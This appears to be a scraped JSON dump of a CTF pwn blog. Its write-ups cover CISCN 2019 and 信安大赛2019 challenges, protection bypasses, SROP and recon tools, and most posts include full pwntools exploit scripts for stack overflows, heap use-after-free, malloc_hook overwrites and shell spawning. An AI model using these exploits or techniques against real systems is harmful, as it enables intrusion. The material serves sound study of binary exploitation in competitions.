exp待补充https://xz.aliyun.com/t/5216#toc-2","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"}]},{"title":"ciscn 2019 pwn","slug":"ciscn-2019-pwn","date":"2019-06-04T13:20:37.000Z","updated":"2019-06-07T02:12:03.642Z","comments":true,"path":"2019/06/04/ciscn-2019-pwn/","link":"","permalink":"http://siriuswhiter.tk/2019/06/04/ciscn-2019-pwn/","excerpt":"","text":"pwn2题目&amp;&amp;分析ret2libc exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#!/usr/bin/env python2#coding = utf8import sysfrom pwn import *context.log_level = &apos;debug&apos;#context.terminal = [&apos;gnome-terminal&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]if len(sys.argv) &gt; 1: local = 0else: local = 1if local: sh = process(&apos;Emachine&apos;) elf = ELF(&apos;Emachine&apos;) libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)else: sh = remote(&apos;172.29.32.110&apos;,&apos;8888&apos;) elf = ELF(&apos;Emachine&apos;) libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)def en(enc): s = [] res = 0 for i in range(8): sk = enc % 0x100 enc = (enc - sk)/0x100 s.append(sk) for x in s: if x&gt;47 and x &lt;57: x ^= 0xf elif x&lt;= 64 and x &gt;90: x ^= 0xe elif x&lt;=96 and x&gt;122: x ^= 0xd res = x + res*0x100 print s return respop_rdi = 0x0000000000400c83#main = 0x400b28start = 0x400790sh.sendlineafter(&quot;Input your choice!\\n&quot;,&apos;1&apos;)pay = &apos;a&apos;*0x50+&apos;bbbbbbbb&apos;+p64(pop_rdi)+p64(elf.got[&apos;puts&apos;])+p64(elf.symbols[&apos;puts&apos;])+p64(start)sh.sendline(pay)sh.recvuntil(&apos;oooooooo&apos;)sh.recvuntil(&apos;\\n&apos;)leak = u64(sh.recvuntil(&apos;\\n&apos;,drop=True).ljust(8,&apos;\\x00&apos;))#print hex(e)#leak =en(e)print hex(leak)system = leak - libc.symbols[&apos;puts&apos;] +libc.symbols[&apos;system&apos;]#environ = leak - libc.symbols[&apos;puts&apos;] +libc.symbols[&apos;environ&apos;]read = leak - libc.symbols[&apos;puts&apos;] +libc.symbols[&apos;read&apos;]print hex(system)print hex(read)#gdb.attach(sh)sh.recv()sh.sendline(&apos;1&apos;)pop_rsi_r15 = 0x0000000000400c81#pay = &apos;a&apos;*0x50+&apos;bbbbbbbb&apos;+p64(pop_rdi)+p64(0)+p64(pop_rsi_r15)+p64(0x602080)+p64(0)+p64(read)+p64(start)pay = &apos;a&apos;*0x50+&apos;bbbbbbbb&apos;+p64(pop_rdi)+p64(0x6020a8)+p64(elf.symbols[&apos;gets&apos;])+p64(start)sh.sendline(pay)sh.sendline(&apos;/bin/sh\\x00&apos;)sh.recv()sh.sendline(&apos;1&apos;)#gdb.attach(sh)pay = &apos;a&apos;*0x50+&apos;bbbbbbbb&apos;+p64(pop_rdi)+p64(0x6020a8)+p64(system)+p64(start)sh.send(pay)sh.interactive() pwn3当时没看，血亏。 题目&amp;&amp;分析溢出+uaf漏洞 exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#!/usr/bin/env python2#coding = utf8import sysfrom pwn import *context.log_level = &apos;debug&apos;#context.terminal = [&apos;gnome-terminal&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]if len(sys.argv) &gt; 1: local = 0else: local = 1if local: sh = process(&apos;./pwn&apos;) elf = ELF(&apos;./pwn&apos;) libc = ELF(&apos;/lib/x86_64-linux-gnu/libc-2.23.so&apos;)else: sh = remote(&apos;&apos;,&apos;&apos;) elf = ELF(&apos;pwn&apos;) libc = ELF(&apos;libc.so.6&apos;)def create(size,name): sh.sendlineafter(&quot;Command: \\n&quot;,&quot;1&quot;) sh.sendlineafter(&quot;size: \\n&quot;,str(size)) sh.sendafter(&quot;name: \\n&quot;,name)def show(index): sh.sendlineafter(&quot;Command: \\n&quot;,&apos;2&apos;) sh.sendlineafter(&apos;index: \\n&apos;,str(index))def dele(index): sh.sendlineafter(&quot;Command: \\n&quot;,&apos;3&apos;) sh.sendlineafter(&apos;weapon:\\n&apos;,str(index))def backdoor(index): sh.sendlineafter(&quot;Command: \\n&quot;,&apos;666&apos;) sh.sendlineafter(&quot;weapon:\\n&quot;,str(index))create(0x100,&apos;a\\n&apos;)create(0x60,&apos;b\\n&apos;)create(0x60,&apos;c\\n&apos;)create(0x60,&apos;a&apos;*0x10+p64(0x110)+p64(0x41)+&apos;\\n&apos;)dele(0)show(0)sh.recvuntil(&quot;attack_times: &quot;)libc.base = int(sh.recvuntil(&quot;\\n&quot;,drop=True))-0x3c4b78print hex(libc.base)malloc_hook = libc.base+libc.symbols[&apos;__malloc_hook&apos;]#0x3c4b00print hex(malloc_hook)one_gadget = libc.base+0xf02a4#0x4526acreate(0x100,&apos;a&apos;*0xf0+p64(0x110)+p64(0x111))dele(2)dele(1)create(0x100,&apos;a&apos;*0x58+p64(0x71)+p64(malloc_hook-0x23)+&apos;\\n&apos;)create(0x60,&apos;b\\n&apos;)create(0x60,&apos;aaa&apos;+p64(one_gadget)+&apos;\\n&apos;)#dele(7)#create(0x4f,&apos;\\n&apos;)#gdb.attach(sh)sh.interactive() pwn5没注意到一个煞笔漏洞，被忽悠的以为有size检测，把好好的一道送分题送了 题目&amp;&amp;分析开局可以泄露libc地址，本来用的是fmt，结果可以直接泄露。之后uaf exp123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *sh = process(&quot;./pwn&quot;)#sh = remote(&quot;172.29.21.114&quot;, 8888)# todo check libc versionlibc = ELF(&quot;libc-2.23.so&quot;, checksec = False)sh.sendafter(&quot;name?&quot;,&quot;a&quot;*7+&quot;b&quot;)sh.recvuntil(&quot;ab&quot;)addr = u64(sh.recv(6) +&quot;\\x00&quot;*2)-0x6fdbdprint(hex(addr))sh.sendlineafter(&quot;ID.&quot;,&quot;123&quot;)def add(size, content): sh.sendlineafter(&quot;choice:&quot;, &quot;1&quot;) sh.sendlineafter(&quot;story:&quot;,str(size)) sh.sendafter(&quot;story&quot;, content)def remove(index): sh.sendlineafter(&quot;choice:&quot;,&quot;4&quot;) sh.sendlineafter(&quot;dex:&quot;,str(index))add(0x68, &quot;123&quot;)add(0x68, &quot;123&quot;)remove(0)remove(1)remove(0)add(0x68, p64(addr+libc.symbols[&quot;__malloc_hook&quot;]-35))add(0x68,&quot;aaa&quot;)add(0x68,&quot;bbb&quot;)add(0x68,&quot;a&quot;*19+p64(addr+0xf1147))#0xf02a4))#add(0x10,&apos;a&apos;)#remove(0)#remove(0)gdb.attach(p)sh.interactive()","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"},{"name":"stack","slug":"stack","permalink":"http://siriuswhiter.tk/tags/stack/"}]},{"title":"Bypass Protect","slug":"bypass-protect","date":"2019-05-29T15:11:48.000Z","updated":"2019-06-07T02:40:29.819Z","comments":true,"path":"2019/05/29/bypass-protect/","link":"","permalink":"http://siriuswhiter.tk/2019/05/29/bypass-protect/","excerpt":"","text":"Canarycanary用来检测栈溢出,程序正常的走完了流程，到函数执行完的时候，程序会再次从一个神奇的地方把canary的值取出来，和之前放在栈上的canary进行比较，如果因为栈溢出什么的原因覆盖到了canary而导致canary发生了变化则直接终止程序。canary的最低位恒为零，使得不存在截断问题。 格式化字符串通过格式化字符串读取canary的值，然后在栈溢出的padding块把canary所在位置的值用正确的canary替换，从而绕过canary的检测。或者直接任意地址写覆盖返回地址之类的也可以绕过。 针对fork的进程对fork而言，作用相当于自我复制，每一次复制出来的程序，内存布局都是一样的，当然canary值也一样。那我们就可以逐位爆破，如果程序GG了就说明这一位不对，如果程序正常就可以接着跑下一位，直到跑出正确的canary。 ssp leak（Stack Smashing Protector ）如果canary被我们的值覆盖而发生了变化，程序会执行函数___stack_chk_fail() ___stack_chk_fail()源码123456789101112131415void __attribute__ ((noreturn)) __stack_chk_fail (void) &#123; __fortify_fail (&quot;stack smashing detected&quot;); &#125;void __attribute__ ((noreturn)) __fortify_fail (msg) const char *msg; &#123; /* The loop is added only to keep gcc happy. */ while (1) __libc_message (2, &quot;*** %s ***: %s terminated\\n&quot;, msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;) &#125; libc_hidden_def (__fortify_fail) __libc_message 的第二个%s输出的是argv[0]，argv[0]是指向第一个启动参数字符串的指针，会在栈中存放，只要能够输入足够长的字符串覆盖掉argv[0]，我们就能让canary保护输出我们想要地址上的值。 Modify the TLS正常情况下，canary取值是:32 bits:12mov eax, large gs:14hmov [ebp+var_C], eax 64 bits:12mov rax, fs:28hmov [rbp+var_8], rax 而段寄存器fs &amp;&amp; gs的定义是指向本线程的TLS结构 在vvar与 /lib/x86_64-linux-gnu/ld-2.23.so之间的一段空间,可以看到有写权限64位一般在该段的起始地址＋0x1700+0x28处 / 32位 +0x14123456789101112131415161718192021222324252627 vmmapLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA 0x400000 0x401000 r-xp 1000 0 /home/sirius/tikool/prac/canary/canary_test 0x600000 0x601000 r--p 1000 0 /home/sirius/tikool/prac/canary/canary_test 0x601000 0x602000 rw-p 1000 1000 /home/sirius/tikool/prac/canary/canary_test 0x7ffff7a0d000 0x7ffff7bcd000 r-xp 1c0000 0 /lib/x86_64-linux-gnu/libc-2.23.so 0x7ffff7bcd000 0x7ffff7dcd000 ---p 200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so 0x7ffff7dcd000 0x7ffff7dd1000 r--p 4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so 0x7ffff7dd1000 0x7ffff7dd3000 rw-p 2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so 0x7ffff7dd3000 0x7ffff7dd7000 rw-p 4000 0 0x7ffff7dd7000 0x7ffff7dfd000 r-xp 26000 0 /lib/x86_64-linux-gnu/ld-2.23.so 0x7ffff7fda000 0x7ffff7fdd000 rw-p 3000 0 0x7ffff7ff7000 0x7ffff7ffa000 r--p 3000 0 [vvar] 0x7ffff7ffa000 0x7ffff7ffc000 r-xp 2000 0 [vdso] 0x7ffff7ffc000 0x7ffff7ffd000 r--p 1000 25000 /lib/x86_64-linux-gnu/ld-2.23.so 0x7ffff7ffd000 0x7ffff7ffe000 rw-p 1000 26000 /lib/x86_64-linux-gnu/ld-2.23.so 0x7ffff7ffe000 0x7ffff7fff000 rw-p 1000 0 0x7ffffffde000 0x7ffffffff000 rw-p 21000 0 [stack]0xffffffffff600000 0xffffffffff601000 r-xp 1000 0 [vsyscall]x/10gx 0x7ffff7fda000+0x17000x7ffff7fdb700: 0x00007ffff7fdb700 0x00007ffff7fda0100x7ffff7fdb710: 0x00007ffff7fdb700 0x00000000000000000x7ffff7fdb720: 0x0000000000000000 0x2928659c8989cd000x7ffff7fdb730: 0xb97e5185f9afb6be 0x00000000000000000x7ffff7fdb740: 0x0000000000000000 0x0000000000000000 PIEPIE(position-independent executable, 地址无关可执行文件)技术是一个针对代码段.text, 数据段.*data，.bss等固定地址的一个防护技术。同ASLR一样，应用了PIE的程序会在每次加载时都变换加载基址，从而使位于程序本身的gadget也失效。 partial write由于内存的页载入机制，PIE的随机化只能影响到单个内存页。通常来说，一个内存页大小为0x1000，这就意味着不管地址怎么变，某条指令的后12位，3个十六进制数的地址是始终不变的。因此通过覆盖EIP的后8或16位 (按字节写入，每字节8位)就可以快速爆破或者直接劫持EIP。 leak libc addrPIE影响的只是程序加载基址，并不会影响指令间的相对地址，因此我们如果能泄露出程序或libc的某些地址，我们就可以利用偏移来达到目的。这也是比较常用的方法。 vdso/vsyscall在开启了ASLR的系统上运行PIE程序，就意味着所有的地址都是随机化的。然而在某些版本的系统中这个结论并不成立，原因是存在着一个神奇的vsyscall。（由于vsyscall在一部分发行版本中的内核已经被裁减掉了，新版的kali也属于其中之一。vsyscall在内核中实现，无法用docker模拟，因此任何与vsyscall相关的实验都改成在Ubuntu 16.04上进行，同时libc中的偏移需要进行修正） 关于vsyscall1简单地说，现代的Windows/*Unix操作系统都采用了分级保护的方式，内核代码位于R0，用户代码位于R3。许多对硬件和内核等的操作都会被包装成内核函数并提供一个接口给用户层代码调用，这个接口就是我们熟知的int 0x80/syscall+调用号模式。当我们每次调用这个接口时，为了保证数据的隔离，我们需要把当前的上下文(寄存器状态等)保存好，然后切换到内核态运行内核函数，然后将内核函数返回的结果放置到对应的寄存器和内存中，再恢复上下文，切换到用户模式。这一过程需要耗费一定的性能。对于某些系统调用，如gettimeofday来说，由于他们经常被调用，如果每次被调用都要这么来回折腾一遍，开销就会变成一个累赘。因此系统把几个常用的无参内核调用从内核中映射到用户空间中，这就是vsyscall 由于vsyscall地址的固定性，这个本来是为了节省开销的设置造成了很大的隐患，因此vsyscall很快就被新的机制vdso所取代。与vsyscall不同的是，vdso的地址也是随机化的，且其中的指令可以任意执行，不需要从入口开始，这就意味着我们可以利用vdso中的syscall来干一些坏事了。","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"},{"name":"stack","slug":"stack","permalink":"http://siriuswhiter.tk/tags/stack/"}]},{"title":"Introduction to pwn1.5--SROP","slug":"introduction-to-pwn1-5-srop","date":"2019-05-24T08:35:36.000Z","updated":"2019-05-30T08:52:48.225Z","comments":true,"path":"2019/05/24/introduction-to-pwn1-5-srop/","link":"","permalink":"http://siriuswhiter.tk/2019/05/24/introduction-to-pwn1-5-srop/","excerpt":"","text":"这学期真实忙成狗，再加上之前状态不好，这学期pwn方向的技术没有太大进展，更多的是在查缺补漏，稳固基础 SROP漏洞原理之前没去看过，现在抽时间来看一下，原理比想象中的更简单一些，比较容易理解。ctfwiki上的： https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop/#signal 这里直接使用wiki上的说法： rt_signal 1234567signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。1. 内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。2. 内核会为该进程保存相应的上下文，主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址。此时栈的结构如下图所示，我们称 ucontext 以及 siginfo 这一段为 Signal Frame。需要注意的是，这一部分是在用户进程的地址空间的。之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。3. signal handler 返回后，内核为执行 sigreturn 系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 77，64 位的系统调用号为 15。 简单来讲就是unix系统在传递signal信息时，会将进程信息以Signal Frame 的格式保存在用户态空间的栈中，而且在回调时并不会有任何检查，所以只要能够改变其结构中的关键数据，就可以使得在恢复进程执行时获得shell或者其他系统调用。 利用 利用条件 足够的栈溢出以存放sigal frame结构体（ps: 不一定要放在栈中 需要知道： “/bin/sh” Signal Frame syscall sigreturn 利用方式pwntools中实现了SROP的库，这样就免去了自己费劲构造结构体的过程 格式：(设置结构体中保存的需要修改的寄存器即可)1234567sigframe = SigreturnFrame()sigframe.rax = constants.SYS_execvesigframe.rdi = stack_addr + 0x120 # &quot;/bin/sh&quot; &apos;s addrsigframe.rsi = 0x0sigframe.rdx = 0x0sigframe.rsp = stack_addrsigframe.rip = syscall_ret 例题题目源代码:1234567891011section .textglobal _start_start:xor rax, rax;mov edx, 400h;mov rsi, rsp;mov rdi, rax;syscall;retn; 编译链接：12nasm srop.asm -f elf64ld -m elf_x86_64 srop.o -o srop 分析就是一个调用read系统调用的函数，在栈顶输入0x400个字节，这里我们使用srop来看 exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from pwn import *from LibcSearcher import *small = ELF(&apos;./srop&apos;)sh = process(&apos;./srop&apos;)context.arch = &apos;amd64&apos;context.log_level = &apos;debug&apos;syscall_ret = 0x000000000040008Estart_addr = 0x0000000000400080## set start addr three timespayload = p64(start_addr) * 3sh.send(payload)## modify the return addr to start_addr+3## so that skip the xor rax,rax; then the rax=1## get stack addrsh.send(&apos;\\x83&apos;)stack_addr = u64(sh.recv()[8:16])log.success(&apos;leak stack addr :&apos; + hex(stack_addr))gdb.attach(sh)## make the rsp point to stack_addr## the frame is read(0,stack_addr,0x400)sigframe = SigreturnFrame()sigframe.rax = constants.SYS_readsigframe.rdi = 0sigframe.rsi = stack_addrsigframe.rdx = 0x400sigframe.rsp = stack_addrsigframe.rip = syscall_retpayload = p64(start_addr) + &apos;a&apos; * 8 + str(sigframe)sh.send(payload)## set rax=15 and call sigreturnsigreturn = p64(syscall_ret) + &apos;b&apos; * 7sh.send(sigreturn)## call execv(&quot;/bin/sh&quot;,0,0)sigframe = SigreturnFrame()sigframe.rax = constants.SYS_execvesigframe.rdi = stack_addr + 0x120 # &quot;/bin/sh&quot; &apos;s addrsigframe.rsi = 0x0sigframe.rdx = 0x0sigframe.rsp = stack_addrsigframe.rip = syscall_retframe_payload = p64(start_addr) + &apos;b&apos; * 8 + str(sigframe)print len(frame_payload)payload = frame_payload + (0x120 - len(frame_payload)) * &apos;\\x00&apos; + &apos;/bin/sh\\x00&apos;sh.send(payload)sh.send(sigreturn)sh.interactive()","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"stack","slug":"stack","permalink":"http://siriuswhiter.tk/tags/stack/"}]},{"title":"渗透测试--信息收集篇","slug":"渗透测试-信息收集篇","date":"2019-05-23T07:13:51.000Z","updated":"2019-05-24T13:11:32.815Z","comments":true,"path":"2019/05/23/渗透测试-信息收集篇/","link":"","permalink":"http://siriuswhiter.tk/2019/05/23/渗透测试-信息收集篇/","excerpt":"","text":"DNS+IP 挖掘信息域名信息whois + domainnamehttp://whois.chinaz.com/ nslookup dig fierce 工具暴力破解dns： fierce -dns weburl ip2locationhttps://www.maxmind.com/en/home 国内ip查询 http://www.cz88.net/ https://www.ip-adress.com/ google map 查询 子域名查询http://searchdns.netcraft.com https://toolbar.netcraft.com/site_report 站点信息 Layer子域名挖掘机 dmitry信息收集工具: dmitry -winse weburl ip2domainhttps://www.ip-adress.com/reverse-ip-lookup 国内 不仅是信息反查： http://www.7c.com/ 搜索引擎google hackingGDHB 谷歌黑客数据库： https://www.exploit-db.com/google-hacking-database 自动化工具： SiteDigger Search Diggity ： https://www.bishopfox.com/resources/tools/google-hacking-diggity/attack-tools/ gooscan 检索特定类型的文件 google: site:sitename filetype: typename, 可能含有敏感文件 Email泄露网站信息： metasploit: search_email_collector 模块 搜索可能存在漏洞的界面，如登陆界面可能存在SQL注入： google: site:sitename inurl:login 网站目录探索 google： parent directory site:sitename // 不是特别好用 暴力搜索 metasploit: brute_dirs, dir_listing, dir_scanner工具：御剑，wwwscan， dirbuster，cansina robots.txt 所指出的不应当被抓取的目录及文件 其他漏洞搜索引擎： https://fofa.so/ https://www.shodan.io/ 工具：","categories":[],"tags":[]},{"title":"信安大赛2019-pwn","slug":"信安大赛2019-pwn","date":"2019-04-22T12:01:10.000Z","updated":"2019-04-23T05:17:51.058Z","comments":true,"path":"2019/04/22/信安大赛2019-pwn/","link":"","permalink":"http://siriuswhiter.tk/2019/04/22/信安大赛2019-pwn/","excerpt":"","text":"太菜了，堆的题要么找不到洞，要么找不到好的思路，得加紧训练 your_pwn题目关键函数 123456789101112131415 memset(&amp;s, 0, 0x100uLL); memset(arr, 0, 0x28uLL); for ( i = 0; i &lt;= 40; ++i ) &#123; puts(&quot;input index&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;idx); printf(&quot;now value(hex) %x\\n&quot;, (unsigned int)arr[idx]); puts(&quot;input new value&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;new_v); arr[idx] = new_v; &#125; puts(&quot;do you want continue(yes/no)? &quot;); read(0, &amp;s, 0x100uLL); return strncmp(&amp;s, &quot;yes&quot;, 3uLL) == 0;&#125; 分析原意是可以给arr的每个地址赋新值，但是因为其没有对idx进行限制，因而相当于任意地址写，同时因为其会先将地址处的值显示出来，因而可以先泄露地址 通过泄露栈中的libc_start_main+240,得到libc基址同时查询得到libc版本为2.23，因此可以直接计算处one_adget 地址，最后用同样的方法再循环写入返回地址为 one_gadget即可； exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657from pwn import *context.log_level = &apos;debug&apos;#sh=process(&apos;./pwn&apos;)sh=remote(&apos;1b190bf34e999d7f752a35fa9ee0d911.kr-lab.com&apos;,&apos;57856&apos;)#(&apos;111.198.29.45&apos;,&apos;32440&apos;)elf = ELF(&apos;./pwn&apos;)sh.sendlineafter(&apos;name:&apos;,&apos;name&apos;)leak = &apos;&apos;def scan(idx): global leak sh.sendlineafter(&apos;index\\n&apos;,str(idx)) sh.recvuntil(&apos;(hex) &apos;) r = sh.recvuntil(&apos;\\n&apos;,drop=True)[-2:] print r leak =r+leak l=int(r,16) sh.sendlineafter(&apos;value\\n&apos;,str(l))for i in range(632,638): scan(i)leak=leak.ljust(8,&apos;\\x00&apos;)print leakleak_addr = int(&apos;0x&apos;+leak,16)print hex(leak_addr)libc_start = leak_addr -240 print &apos;libc_start_main:&apos; + hex(libc_start)libc = leak_addr-elf.plt[&apos;__libc_start_main&apos;]-0x1ff20print hex(libc)#system = libc+ 0x045390#binsh = libc + 0x18cd57one = 0x4526a + libcprint &apos;one: &apos;+ hex(one)ls = [0,0,0,0,0,0,0,0]for i in range(0,8): ls[i] = one%0x100 print hex(ls[i]) one /= 0x100for i in range(344,352): j=i-344 print hex(ls[j]) sh.sendlineafter(&apos;index\\n&apos;,str(i)) sh.sendlineafter(&apos;value\\n&apos;,str(ls[j])) # sleep(2) #gdb.attach(sh,&apos;b* 0xc2a&apos;+str(libc))sh.sendlineafter(&apos;index\\n&apos;,str(-1))sh.sendlineafter(&apos;value\\n&apos;,str(1))sh.sendlineafter(&apos;? \\n&apos;,&apos;no&apos;) #gdb.attach(sh)sh.interactive() daily做一半电脑死机了。。坑。。。 题目漏洞点比较隐蔽，看了好久 关键函数1234567891011121314151617181920212223242526272829303132unsigned __int64 remove()&#123; int idx; // [rsp+Ch] [rbp-14h] char buf; // [rsp+10h] [rbp-10h] unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); if ( cnt ) &#123; printf(&quot;Please enter the index of daily:&quot;); read(0, &amp;buf, 8uLL); idx = atoi(&amp;buf); if ( *(_QWORD *)&amp;ptr[4 * idx + 2] ) // 没有检查idx的大小 &#123; free(*(void **)&amp;ptr[4 * idx + 2]); *(_QWORD *)&amp;ptr[4 * idx + 2] = 0LL; ptr[4 * idx] = 0; puts(&quot;remove successful!!&quot;); --cnt; &#125; else &#123; puts(&quot;invaild index&quot;); &#125; &#125; else &#123; puts(&quot;No pages in the daily&quot;); &#125; return __readfsqword(0x28u) ^ v3;&#125; 分析前面很容易想到利用malloc_consolidate 来泄露libc地址及heap地址； 而漏洞点在于在删除chunk时，没有对输入的idx进行检查，所以只要释放的地址处的chunk可以通过检查，就可以被置入bin链表中 而只要泄露堆地址，就可以运算得到其index，因为输入的是整型数据，所以在一定情况下堆分配离bss段较远时会出错，不过这个问题可以多次尝试来解决 所以在堆上伪造如同bss段的结构体(size+ptr)，delete时将idx指向这里free掉一个chunk，而因为这样并不会情况bss段存储的结构体，我们就可以UAF 最后因为尝试one_gadget条件无法满足，最后只能换成调用system函数来覆盖free_hook来getshell exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071from pwn import *sh = process(&apos;./pwn&apos;)#sh = remote(&apos;5f0cfa41a052c741f4beafe9d083d281.kr - lab.com&apos;,58512)elf = ELF(&apos;./pwn&apos;)libc = ELF(&apos;/lib/x86_64-linux-gnu/libc-2.23.so&apos;)def add(size,con): sh.recvuntil(&apos;Your choice:&apos;) sh.sendline(&apos;2&apos;) sh.recvuntil(&apos;daily:&apos;) sh.sendline(str(size)) sh.recvuntil(&apos;daily\\n&apos;) sh.send(con)def dele(idx): sh.recvuntil(&apos;choice:&apos;) sh.sendline(&apos;4&apos;) sh.recvuntil(&apos;daily:&apos;) sh.sendline(str(idx))def edit(idx,con): sh.recvuntil(&apos;Your choice:&apos;) sh.sendline(&apos;3&apos;) sh.recvuntil(&apos;daily:&apos;) sh.sendline(str(idx)) sh.recvuntil(&apos;daily&apos;) sh.send(con)def show(): sh.recvuntil(&apos;choice:&apos;) sh.sendline(&apos;1&apos;)add(0x20,&apos;a&apos;)add(0x800,&apos;a&apos;)add(0x10,&apos;a&apos;)dele(1)add(0x100,&apos;aaaaaa&apos;)show()sh.recvuntil(&apos;a&apos;*8)main_arena = u64(sh.recv(6).ljust(8,&apos;\\x00&apos;)) - 0x548libc_base = main_arena - libc.symbols[&apos;__malloc_hook&apos;] - 0x10one_gadget = libc_base + libc.symbols[&apos;system&apos;]free_hook = libc_base + libc.symbols[&apos;__free_hook&apos;]edit(1,&apos;a&apos;*24)show()sh.recvuntil(&apos;a&apos;*24)heap = u64(sh.recv(4).ljust(8,&apos;\\x00&apos;))add(0x700-8,&apos;aaa&apos;)add(0x10,&apos;aaa&apos;)add(0x10,&apos;aaa&apos;)dele(4)dele(5)index = (heap + 0x10 - 0x602060)/16payload = p64(0x100) + p64(heap + 0x830 + 0x10)edit(1,payload)dele(index)add(0x10,p64(0x602058))add(0x10,&apos;c&apos;)add(0x10,&apos;d&apos;)add(0x10,&apos;e&apos;)edit(7,p64(free_hook))edit(0,p64(one_gadget))edit(1,&apos;/bin/sh\\x00&apos;)dele(1)sh.interactive() baby_pwn题目关键函数123456ssize_t vuln()&#123; char buf; // [esp+0h] [ebp-28h] return read(0, &amp;buf, 0x100u);&#125; 保护12345arch: amd64-64-littleRELRO: Full RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000) 分析直接给了溢出，同时除了PIE保护全开，没有给libc，可以确定是ret2_dl_runtime_resolve 可以直接使用roputils库 ，在bss段伪造结构体 ，然后上脚本即可 exp123456789101112131415161718192021222324252627282930import sysimport roputilsfrom pwn import *context.log_level = &apos;debug&apos;offset = 44readplt = 0x08048390bss = 0x0804a068vulFunc = 0x0804852d#p = process(&apos;./pwn&apos;)p = remote(&apos;da61f2425ce71e72c1ef02104c3bfb69.kr-lab.com&apos;,&apos;33865&apos;)rop = roputils.ROP(&apos;./pwn&apos;)addr_bss = rop.section(&apos;.bss&apos;)# step1 : write sh &amp; resolve struct to bssbuf1 = &apos;a&apos; * offset #44buf1 += p32(readplt) + p32(vulFunc) + p32(0) + p32(addr_bss) + p32(100)p.send(buf1)buf2 = rop.string(&apos;/bin/sh&apos;)buf2 += rop.fill(20, buf2)buf2 += rop.dl_resolve_data(addr_bss+20, &apos;system&apos;)buf2 += rop.fill(100, buf2)p.send(buf2)#step2 : use dl_resolve_call get system &amp; system(&apos;/bin/sh&apos;)buf3 = &apos;a&apos;*44 + rop.dl_resolve_call(addr_bss+20, addr_bss)p.send(buf3)p.interactive() double其实很简单的一道题。。。结果当天没做出来。。过了一天，昨天睡觉前突然意识到怎么做。。。最后写出来用了不到20分钟！！难受 题目程序使用链表来记录分配的chunk，删除时也就是链表的元素删除，所以当时会陷入对链表的问题的查找，而实际上问题不在这里 主要问题函数： 分配的new函数1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556unsigned __int64 new()&#123; int size; // [rsp+4h] [rbp-12Ch] struc *ptr; // [rsp+8h] [rbp-128h] struc *last; // [rsp+10h] [rbp-120h] char *dest; // [rsp+18h] [rbp-118h] char s2; // [rsp+20h] [rbp-110h] unsigned __int64 v6; // [rsp+128h] [rbp-8h] v6 = __readfsqword(0x28u); ptr = (struc *)malloc(0x18uLL); if ( ptr ) &#123; puts(&quot;Your data:&quot;); size = get_str(&amp;s2, 0x100); last = ptrStop; if ( ptrStop &amp;&amp; !strcmp((const char *)ptrStop-&gt;chunk_ptr, &amp;s2) ) &#123; ptr-&gt;idx = last-&gt;idx + 1; ptr-&gt;size = last-&gt;size; ptr-&gt;chunk_ptr = last-&gt;chunk_ptr; ptr-&gt;next_chunk = 0LL; last-&gt;next_chunk = (__int64)ptr; ptrStop = ptr; &#125; else &#123; dest = (char *)malloc(size + 1); if ( !dest ) &#123; puts(&quot;Malloc Failed, Error&quot;); free(ptr); return __readfsqword(0x28u) ^ v6; &#125; strncpy(dest, &amp;s2, size + 1); ptr-&gt;size = size; ptr-&gt;chunk_ptr = (__int64)dest; ptr-&gt;next_chunk = 0LL; if ( ptrStart ) &#123; ptr-&gt;idx = last-&gt;idx + 1; last-&gt;next_chunk = (__int64)ptr; &#125; else &#123; ptr-&gt;idx = 0; ptrStart = (__int64)ptr; &#125; ptrStop = ptr; &#125; printf(&quot;Success, index: %d\\n&quot;, (unsigned int)ptr-&gt;idx); return __readfsqword(0x28u) ^ v6; &#125; puts(&quot;Malloc Failed,Error&quot;); return __readfsqword(0x28u) ^ v6;&#125; 